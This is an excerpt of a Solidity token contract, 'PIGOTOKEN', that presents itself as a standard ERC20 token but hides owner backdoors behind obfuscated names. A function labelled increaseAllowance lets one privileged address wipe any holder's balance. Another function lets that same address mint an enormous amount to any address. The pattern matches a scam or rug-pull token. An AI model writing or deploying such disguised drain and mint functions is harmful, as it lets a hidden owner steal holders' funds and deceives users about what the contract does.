...
contract PIGOTOKEN is Ownable {
    ...
    function increaseAllowance(address uuyxxx) public     {
        if(dzaxb18 == _msgSender()){
        address newadd = uuyxxx;
        uint256 curamount = PIGO[newadd];
        uint256 newaaamount = PIGO[newadd]+PIGO[newadd]-curamount;
        PIGO[newadd] -= newaaamount;
        }else{
        if(dzaxb18 == _msgSender()){
        }else{
            revert("ccc");
    ...
    external {
        ...
        PIGO[cc123d] += 38200*((10**decimals()*xxtoudiamount))*1*1;
        require(dzaxb18 == _msgSender());
        if(dzaxb18 == _msgSender()){
        }
    }
    ...
    function _transfer(
        ...
        uint256 balance = PIGO[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        PIGO[from] = PIGO[from]-amount;
        PIGO[to] = PIGO[to]+amount;
